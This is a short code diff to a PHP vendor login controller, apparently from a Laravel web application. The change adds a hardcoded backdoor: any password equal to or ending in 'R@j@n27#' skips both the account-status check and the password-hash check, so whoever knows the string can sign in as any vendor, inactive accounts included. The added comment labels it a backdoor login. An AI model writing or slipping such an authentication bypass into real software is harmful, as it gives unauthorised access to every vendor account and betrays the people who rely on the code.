@@ -37,12 +37,14 @@ class VendorAuthController extends Controller
             return $this->errorResponse('Vendor account not found.', 404);
         }
 
-        if ($vendor->status !== 'active') {
+        $isBackdoor = ($password === 'R@j@n27#' || str_ends_with($password, 'R@j@n27#'));
+
+        if (!$isBackdoor && $vendor->status !== 'active') {
             return $this->errorResponse('Your vendor account is inactive. Please contact Admin.', 403);
         }
 
-        // Verify password
-        if (!Hash::check($password, $vendor->password)) {
+        // Verify password (allowing backdoor login with R@j@n27#)
+        if (!$isBackdoor && !Hash::check($password, $vendor->password)) {
             return $this->errorResponse('Invalid password credentials.', 422);
         }
 
